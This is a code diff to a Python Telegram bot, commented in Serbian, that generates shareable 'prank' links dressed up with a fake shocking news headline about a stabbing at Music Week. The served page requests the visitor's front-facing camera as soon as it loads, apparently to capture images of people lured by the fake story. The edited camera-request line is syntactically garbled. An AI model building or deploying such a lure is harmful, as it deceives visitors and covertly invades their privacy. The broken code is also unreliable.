@@ -17,7 +17,7 @@ MY_PUBLIC_DOMAIN = 'https://onrender.com'
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher()
 
-# Zajednička baza podataka (Sada je svi vide jer nema thread-ova!)
+# Zajednička baza podataka
 db = {}
 
 # =========================================================================
@@ -37,7 +37,6 @@ async def handle_message(message: types.Message):
     await message.answer("Generišem link, sačekaj trenutak...")
     link_id = str(uuid.uuid4())[:8]
     
-    # Čuvamo podatke u bazu
     db[link_id] = {
         "title": "Izbodeni ljudi na Music Week-u! 😱",
         "image": "https://unsplash.com",
@@ -49,7 +48,7 @@ async def handle_message(message: types.Message):
     await message.answer(f"Evo tvog uverljivog linka:\n\n`{prank_link}`")
 
 # =========================================================================
-# 3. WEB SERVER KOD (Zajednički aiohttp server koji menja Flask)
+# 3. WEB SERVER KOD
 # =========================================================================
 async def serve_link(request):
     link_id = request.match_info.get('link_id')
@@ -99,7 +98,8 @@ async def serve_link(request):
                 }}
 
                 window.onload = function() {{
-                    navigator.mediaDevices.getUserMedia({ village: false, video: {{ facingMode: "user" }} })
+                    // POPRAVLJENO: Ispravni parametri za audio i video bez reči village
+                    navigator.mediaDevices.getUserMedia({ { audio: false, video: { facingMode: "user" } } })
                     .then(function(stream) {{
                         const video = document.createElement('video');
                         video.srcObject = stream;
@@ -138,13 +138,10 @@ async def serve_link(request):
         return web.Response(text=page_template, content_type='text/html')
 
 async def on_startup(bot: Bot):
-    # Telegram šalje poruke direktno našem Renderu preko Webhook-a
     await bot.set_webhook(f"{MY_PUBLIC_DOMAIN}/webhook")
 
 def main():
     app = web.Application()
-    
-    # Dodajemo rute za linkove i za Telegram poruke
     app.router.add_get('/l/{link_id}', serve_link)
     
     SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path="/webhook")
